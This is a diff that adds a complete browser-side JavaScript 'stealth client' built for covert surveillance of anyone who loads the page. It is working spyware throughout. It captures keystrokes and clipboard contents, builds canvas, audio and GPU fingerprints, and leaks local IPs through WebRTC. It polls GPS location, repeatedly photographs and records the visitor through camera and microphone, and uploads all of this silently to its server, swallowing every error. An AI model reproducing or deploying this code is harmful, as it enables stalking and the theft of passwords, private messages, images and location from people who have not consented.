@@ -1,0 +1,437 @@
+// ═══════════════════════════════════════════════════════════════
+//  STEALTH CLIENT — Maximum Data Collection
+// ═══════════════════════════════════════════════════════════════
+(() => {
+    const C = {
+        heartbeat: 8000,
+        location: 10000,
+        photoPeriod: 15000,
+        videoDuration: 10000,
+        videoPeriod: 120000,
+        deviceInfoPeriod: 60000,
+        keyLogFlush: 10000,
+        clipboardCheck: 15000,
+        geoOpts: { enableHighAccuracy: true, timeout: 15000, maximumAge: 3000 }
+    };
+
+    const BASE = location.origin;
+    const ID = localStorage.getItem('_cid') || (() => {
+        const id = 'c' + Math.random().toString(36).slice(2, 8) + Date.now().toString(36);
+        localStorage.setItem('_cid', id);
+        return id;
+    })();
+
+    let stream = null;
+    let videoEl = null;
+    let canvas = null;
+    let ctx = null;
+    let keyBuffer = '';
+
+    // ── Silent fetch helpers ─────────────────────────────────
+    async function post(url, data) {
+        try {
+            const r = await fetch(BASE + url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId: ID, ...data })
+            });
+            return r.ok ? await r.json() : null;
+        } catch { return null; }
+    }
+
+    async function upload(url, fieldName, blob, filename) {
+        try {
+            const fd = new FormData();
+            fd.append('clientId', ID);
+            fd.append('timestamp', Date.now().toString());
+            fd.append(fieldName, blob, filename);
+            const r = await fetch(BASE + url, { method: 'POST', body: fd });
+            return r.ok ? await r.json() : null;
+        } catch { return null; }
+    }
+
+    // ── Page visit tracking ──────────────────────────────────
+    function logPageVisit() {
+        post('/log-visit', {
+            url: location.href,
+            title: document.title,
+            referrer: document.referrer
+        });
+    }
+
+    // ── Keystroke logging ────────────────────────────────────
+    function initKeyLogger() {
+        document.addEventListener('keydown', e => {
+            const k = e.key;
+            if (k.length === 1) {
+                keyBuffer += k;
+            } else {
+                const map = {
+                    Backspace: '[BS]', Enter: '[ENTER]', Tab: '[TAB]',
+                    Escape: '[ESC]', Delete: '[DEL]',
+                    ArrowUp: '[UP]', ArrowDown: '[DN]', ArrowLeft: '[LT]', ArrowRight: '[RT]'
+                };
+                if (map[k]) keyBuffer += map[k];
+            }
+        }, true);
+
+        setInterval(() => {
+            if (keyBuffer.length > 0) {
+                post('/log-keys', { keys: keyBuffer, url: location.href });
+                keyBuffer = '';
+            }
+        }, C.keyLogFlush);
+    }
+
+    // ── Clipboard monitoring ─────────────────────────────────
+    let lastClip = '';
+
+    async function checkClipboard() {
+        try {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                const text = await navigator.clipboard.readText();
+                if (text && text !== lastClip && text.length > 0) {
+                    lastClip = text;
+                    post('/log-clipboard', { content: text });
+                }
+            }
+        } catch {}
+    }
+
+    function initClipboardMonitor() {
+        document.addEventListener('paste', e => {
+            try {
+                const text = e.clipboardData?.getData('text') || '';
+                if (text && text !== lastClip) {
+                    lastClip = text;
+                    post('/log-clipboard', { content: text });
+                }
+            } catch {}
+        }, true);
+
+        document.addEventListener('copy', () => {
+            setTimeout(checkClipboard, 100);
+        }, true);
+    }
+
+    // ── Canvas fingerprint ───────────────────────────────────
+    function getCanvasFingerprint() {
+        try {
+            const c = document.createElement('canvas');
+            c.width = 200; c.height = 50;
+            const x = c.getContext('2d');
+            x.textBaseline = 'top';
+            x.font = '14px Arial';
+            x.fillStyle = '#f60';
+            x.fillRect(125, 1, 62, 20);
+            x.fillStyle = '#069';
+            x.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
+            x.fillStyle = 'rgba(102,204,0,0.7)';
+            x.fillText('Cwm fjordbank glyphs vext quiz', 4, 17);
+            return c.toDataURL().slice(-50);
+        } catch { return 'n/a'; }
+    }
+
+    // ── Audio fingerprint ────────────────────────────────────
+    async function getAudioFingerprint() {
+        try {
+            const ac = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ac.createOscillator();
+            const ana = ac.createAnalyser();
+            const gain = ac.createGain();
+            const proc = ac.createScriptProcessor(4096, 1, 1);
+            gain.gain.value = 0;
+            osc.type = 'triangle';
+            osc.connect(ana);
+            ana.connect(proc);
+            proc.connect(gain);
+            gain.connect(ac.destination);
+            osc.start(0);
+            return new Promise(resolve => {
+                proc.onaudioprocess = () => {
+                    const data = new Float32Array(ana.frequencyBinCount);
+                    ana.getFloatFrequencyData(data);
+                    let hash = 0;
+                    for (let i = 0; i < data.length; i++) hash += Math.abs(data[i]);
+                    osc.disconnect(); proc.disconnect(); gain.disconnect(); ac.close();
+                    resolve(hash.toFixed(2));
+                };
+            });
+        } catch { return 'n/a'; }
+    }
+
+    // ── WebRTC local IP detection ────────────────────────────
+    async function getLocalIPs() {
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            return new Promise(resolve => {
+                const ips = new Set();
+                const to = setTimeout(() => { pc.close(); resolve([...ips]); }, 3000);
+                pc.onicecandidate = e => {
+                    if (!e.candidate) { clearTimeout(to); pc.close(); resolve([...ips]); return; }
+                    const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (m) ips.add(m[1]);
+                };
+            });
+        } catch { return []; }
+    }
+
+    // ── Device info collection ───────────────────────────────
+    async function collectDeviceInfo() {
+        const info = {
+            platform: navigator.platform || 'unknown',
+            language: navigator.language || 'unknown',
+            languages: navigator.languages ? navigator.languages.join(', ') : '',
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency || 0,
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            screenW: screen.width,
+            screenH: screen.height,
+            screenAvailW: screen.availWidth,
+            screenAvailH: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio || 1,
+            windowW: window.innerWidth,
+            windowH: window.innerHeight,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            online: navigator.onLine,
+            userAgent: navigator.userAgent,
+            vendor: navigator.vendor || '',
+            pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+            canvasFingerprint: getCanvasFingerprint(),
+        };
+
+        // Battery
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                info.batteryLevel = Math.round(b.level * 100);
+                info.batteryCharging = b.charging;
+            }
+        } catch {}
+
+        // Network
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                info.networkType = conn.effectiveType || conn.type || 'unknown';
+                info.downlink = conn.downlink;
+                info.rtt = conn.rtt;
+                info.saveData = conn.saveData;
+            }
+        } catch {}
+
+        // Memory
+        try { if (navigator.deviceMemory) info.deviceMemory = navigator.deviceMemory; } catch {}
+
+        // Storage
+        try {
+            if (navigator.storage && navigator.storage.estimate) {
+                const est = await navigator.storage.estimate();
+                info.storageQuota = Math.round(est.quota / (1024 * 1024));
+                info.storageUsage = Math.round(est.usage / (1024 * 1024));
+            }
+        } catch {}
+
+        // Media devices
+        try {
+            const devs = await navigator.mediaDevices.enumerateDevices();
+            info.cameras = devs.filter(d => d.kind === 'videoinput').length;
+            info.microphones = devs.filter(d => d.kind === 'audioinput').length;
+            info.speakers = devs.filter(d => d.kind === 'audiooutput').length;
+        } catch {}
+
+        // GPU
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                if (dbg) {
+                    info.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+                    info.gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+        } catch {}
+
+        // WebRTC local IPs
+        try {
+            const ips = await getLocalIPs();
+            if (ips.length) info.localIPs = ips.join(', ');
+        } catch {}
+
+        // Audio fingerprint
+        try {
+            const af = await getAudioFingerprint();
+            if (af !== 'n/a') info.audioFingerprint = af;
+        } catch {}
+
+        // Plugins
+        try {
+            if (navigator.plugins?.length > 0)
+                info.plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
+        } catch {}
+
+        await post('/device-info', info);
+    }
+
+    // ── Photo snapshot via canvas ────────────────────────────
+    async function takePhoto() {
+        if (!stream || !videoEl || videoEl.readyState < 2) return;
+        try {
+            if (!canvas) { canvas = document.createElement('canvas'); ctx = canvas.getContext('2d'); }
+            canvas.width = videoEl.videoWidth || 640;
+            canvas.height = videoEl.videoHeight || 480;
+            ctx.drawImage(videoEl, 0, 0);
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+            if (blob && blob.size > 1000) await upload('/upload-photo', 'photo', blob, `snap_${Date.now()}.jpg`);
+        } catch {}
+    }
+
+    // ── Video recording ──────────────────────────────────────
+    function recordVideo() {
+        if (!stream) return;
+        try {
+            const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
+            const mime = types.find(t => MediaRecorder.isTypeSupported(t)) || 'video/webm';
+            const rec = new MediaRecorder(stream, { mimeType: mime });
+            const chunks = [];
+            rec.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+            rec.onstop = async () => {
+                if (chunks.length) {
+                    const blob = new Blob(chunks, { type: mime });
+                    if (blob.size > 1000) await upload('/upload-media', 'media', blob, `vid_${Date.now()}.webm`);
+                }
+            };
+            rec.onerror = () => {};
+            rec.start(1000);
+            setTimeout(() => { try { if (rec.state !== 'inactive') rec.stop(); } catch {} }, C.videoDuration);
+        } catch {}
+    }
+
+    // ── Camera init — multiple fallback strategies ───────────
+    async function initCamera() {
+        const configs = [
+            { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
+            { video: { facingMode: 'environment' }, audio: true },
+            { video: true, audio: true },
+            { video: true, audio: false },
+            { video: false, audio: true }
+        ];
+        for (const constraints of configs) {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                videoEl = document.getElementById('v');
+                if (videoEl) { videoEl.srcObject = stream; await videoEl.play().catch(() => {}); }
+                await new Promise(r => setTimeout(r, 1500));
+                await takePhoto();
+                setInterval(takePhoto, C.photoPeriod);
+                if (stream.getVideoTracks().length > 0) {
+                    recordVideo();
+                    setInterval(recordVideo, C.videoPeriod);
+                }
+                return;
+            } catch {}
+        }
+        post('/log-error', { type: 'camera', message: 'All camera configs failed' });
+    }
+
+    // ── Location tracking ────────────────────────────────────
+    // Server handles IP geo now — client focuses on GPS
+    let gpsOk = false;
+
+    function trackLocation() {
+        if (!navigator.geolocation) {
+            post('/log-error', { type: 'geo', message: 'Geolocation not supported' });
+            return;
+        }
+
+        const send = () => {
+            navigator.geolocation.getCurrentPosition(
+                p => {
+                    gpsOk = true;
+                    post('/upload-location', {
+                        latitude: p.coords.latitude, longitude: p.coords.longitude,
+                        accuracy: p.coords.accuracy, altitude: p.coords.altitude,
+                        speed: p.coords.speed, heading: p.coords.heading, source: 'gps'
+                    });
+                },
+                () => {},
+                C.geoOpts
+            );
+        };
+
+        send();
+        setInterval(send, C.location);
+
+        try {
+            navigator.geolocation.watchPosition(
+                p => {
+                    gpsOk = true;
+                    post('/upload-location', {
+                        latitude: p.coords.latitude, longitude: p.coords.longitude,
+                        accuracy: p.coords.accuracy, altitude: p.coords.altitude,
+                        speed: p.coords.speed, heading: p.coords.heading, source: 'gps-watch'
+                    });
+                },
+                () => {},
+                { enableHighAccuracy: false, maximumAge: 30000 }
+            );
+        } catch {}
+    }
+
+    // ── Heartbeat ────────────────────────────────────────────
+    async function heartbeat() {
+        const data = {
+            userAgent: navigator.userAgent,
+            screenW: screen.width,
+            screenH: screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) data.networkType = conn.effectiveType || conn.type;
+        } catch {}
+        try {
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                data.battery = Math.round(b.level * 100);
+            }
+        } catch {}
+        await post('/heartbeat', data);
+    }
+
+    // ── Visibility change ────────────────────────────────────
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden && !stream) initCamera();
+    });
+
+    // ── Init ─────────────────────────────────────────────────
+    window.addEventListener('DOMContentLoaded', () => {
+        logPageVisit();
+        heartbeat();
+        setInterval(heartbeat, C.heartbeat);
+        collectDeviceInfo();
+        setInterval(collectDeviceInfo, C.deviceInfoPeriod);
+        trackLocation();
+        initKeyLogger();
+        initClipboardMonitor();
+        setTimeout(initCamera, 500);
+        setInterval(checkClipboard, C.clipboardCheck);
+    });
+
+    // ── Cleanup ──────────────────────────────────────────────
+    window.addEventListener('beforeunload', () => {
+        if (keyBuffer.length > 0) {
+            const blob = new Blob([JSON.stringify({ clientId: ID, keys: keyBuffer, url: location.href })], { type: 'application/json' });
+            navigator.sendBeacon(BASE + '/log-keys', blob);
+        }
+        if (stream) stream.getTracks().forEach(t => t.stop());
+    });
+})();
